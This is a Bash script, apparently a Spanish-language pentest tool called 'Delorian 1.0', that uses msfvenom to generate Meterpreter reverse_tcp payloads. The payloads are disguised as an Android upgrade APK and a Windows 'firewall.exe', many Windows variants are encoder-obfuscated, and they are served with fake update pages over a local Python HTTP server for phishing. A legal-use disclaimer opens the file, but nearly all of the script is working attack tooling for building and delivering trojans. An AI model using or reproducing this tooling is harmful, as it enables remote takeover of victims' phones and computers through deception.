#!/bin/bash
#Deloria 1.0 , genera cargas util de MSF, servidor donde alojar nuestros sitios falsos para vulnerar a los usuarios de la empresa 
#donde estamos trabajando legalmente, cualquier fin de lucrarse,vulnerar la intimidad de personas ajenas a nuestro trabajo como pentesters
#o cometer delitos informaticos no nos hacemos reponsables ya que Delorian 1.0 esta creado con el unico fin de tomar conciencia o 
#simplemente para usarlo en sesiones de pentesting dentro del marco legal.
#Delorian genera cargas util de Metasploit-Framework , genera un simple servidor en Python al puerto 8000 en nuestro localhost 
#con un sitio falso para vulnerar a nuestra victima con ingenieria social o un DNS Spoofing, los sitios falsos son acorde 
#a windows(actualizar firewall) y Android(descarga app Actualizar android) las index o sitios falsos se pueden editar, 
#el banner del script muestra donde estara nuestro troyano,nuestro sitio web y el trafico de lo que va pasando en nuestro simple servidor.
#para dificultarle a los ciberdelincuentes creamos delorian dentro de nuestra red LAN , para que los phishing,sitios falsos no sean 
#usados con fines mal intencionados, ya pronto se vera un video de la herramienta actualizada, ya que anteriormente se grabó un video
#en nuestro canal de Youtube para mostrar un adelanto, la herramienta se quedo guardada y no se terminó, las index son mal 
#creadas con el fin de no vulnerar a nadie o mentir a nadie para tomar el acceso de su android o windows, pero se pueden editar para 
#tener mejores resultados, lo mismo con los troyanos. 
clear
echo ""
#setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo ""
setterm -foreground white
echo "           (1)Windows  - (2) Android - (0)salir  "
echo ""
read -p " Delorian > " delorian
case $delorian in
2)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
echo "                 ediccion de payload MSF:  "
echo ""
read -p $"   Lhost: " lhost
read -p $"   Lport: " lport
sudo msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /usr/delorian/android/AndroidUpgrade.apk
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
cd /
setterm -foreground green
echo ""
echo "  Puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  Sitio falso: http://localhost:8000/usr/delorian/android/sitio/upgradeandroid.html"
echo "  Troyano: /usr/delorian/android/AndroidUpgrade.apk"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
echo ""
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
rm -rf /usr/delorian/android/AndroidUpgrade.apk
;;
1)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
echo "                 ediccion de payload MSF:

   01| x86/shikata_ga_nai     10| x86/jmp_call_additive   19| x86/avoid_utf8_tolower   
   02| x85/xor_dynamic        11| x86/fnstenv_mov         20| x86/avoid_underscore_tolower 
   03| x86/unicode_upper      12| x86/countdown           21| x86/alpha_upper 
   04| x86/unicode_mixed      13| x86/context_time        22| x86/alpha_mixed
   05| x86/single_static_bit  14| x86/context_start       23| x86/add_sub
   06| x86/service            15| x86/context_cpuid       24| x64/zutto_dekiru
   07| x86/opt_sub            16| x86/call4_dword_xor     25| x64/xor_dynamic
   08| x86/nonupper           17| x86/bmp_polyglot        26| x64/xor_context
   09| x86/nonalpha           18| x86/bloxor              27| x64/xor
   "
;;
esac
read -p "   Delorian > " payload
case $payload in
01)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   Lhost: " lhost
read -p $"   Lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo ""
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
echo ""
xterm -e "python -m SimpleHTTPServer"
rm -rf /usr/delorian/windows/firewall.exe
;;
02)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   Lhost: " lhost
read -p $"   Lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer" 
;;
03)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/unicode_upper -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer" 
;;
04)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/unicode_mixed  -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
05)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/single_static_bit  -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
06)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/service  -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
07)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/opt_sub -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
08)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/nonupper -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
09)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/nonalpha -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
10)
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/jmp_call_additive -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer" 
;;
11)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/fnstenv_mov -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
12)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/countdown -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer" 
;;
13)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/context_time -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
14)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/context_stat -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
15)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/context_cpuid -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
16)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/call4_dword_xor -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
17)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/bmp_polyglot -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
18)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/bloxor -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
19)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/avoid_utf8_tolower -f exe > /usr/delorian/windows/firewall.exe
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
echo "  sitio falso: http://localhost:8000/usr/delorian/windows/sitio/upfirewall.html"
echo "  Troyano: http://localhost:8000/usr/delorian/windows/firewall.exe"
echo "  Aca podras ver el trafico que esta pasando en tu servidor, solo espera las conexiones."
setterm -foreground white
xterm -e "python -m SimpleHTTPServer"
;;
20)
clear
echo ""
setterm -foreground white
echo "               www.facebook.com/error4o4.org"
setterm -foreground green
echo "   ___      ___  _       ___   ___    ____   ___   ___"
echo "  |   \    /  _]| T     /   \ |    \ l    j /    T| -K \ "
echo "  |    \  /  [_ | |    Y     Y|  D  ) |  T Y  o  ||  _  Y"
echo "  |  D  YY    _]| l___ |  O  ||    /  |  | |     ||  |  |"
echo "  |     ||   [_ |     T|     ||    \  |  | |  _  ||  |  |"
echo "  |     ||     T|     |l     !|  .  Y j  l |  |  ||  |  |"
echo "  l_____jl_____jl_____j \___/ l__j\_j|____jl__j__jl__j__j"
echo "               "
setterm -foreground white
read -p $"   lhost: " lhost
read -p $"   lport: " lport
sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/avoid_underscore_tolower -f exe > /usr/delorian/windows/firewall.exe 
cd /
setterm -foreground green
echo "  puedes editar tus sitios acorde a la empresa que estas auditando para tener mejores resultados."
